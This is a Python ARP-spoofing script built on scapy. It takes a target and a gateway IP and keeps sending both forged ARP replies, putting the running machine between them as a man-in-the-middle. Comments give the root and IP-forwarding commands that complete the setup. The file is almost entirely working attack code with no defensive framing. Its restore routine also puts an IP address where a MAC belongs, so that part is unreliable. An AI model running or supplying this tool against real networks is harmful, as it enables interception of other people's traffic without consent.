import scapy.all as scapy
import time
import argparse

#sudo su -
#sudo echo 1 > /proc/sys/net/ipv4/ip_forward 
#Commands for forwarding the connection to router

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP.") #Runtime argument
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP.")
    options = parser.parse_args()
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip) #Pdst is IPField and is set to equal the parameter
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #Mac field
    arp_request_broadcast = broadcast/arp_request #Combined request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] #Final request without junk *verbose = False*

    return answered_list[0][1].hwsrc #To get the mac address of the ip (in this case router's mac)

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) #Op = 2 or 1 (2 for respone and 1 for request); pdst = IPField; hwdst = MacField; psrc = Router Ip; all of this has to be information of the target
    #The above packet is used to send the victim a message saying that this pc is the router
    scapy.send(packet, verbose=False) #Sent packet

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_ip, psrc=source_ip, hwsrc=source_mac) #hwsrc = source mac
    scapy.send(packet, count=4, verbose=False)

options = get_arguments()

target_ip = options.target
gateway_ip = options.gateway

try:
    sent_packets_count = 0
    while True: #Loop the packets
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="") #\r to replace already printed text
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C... Resetting ARP tables... Please wait.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

#"192.168.1.136";    ;"192.168.1.1"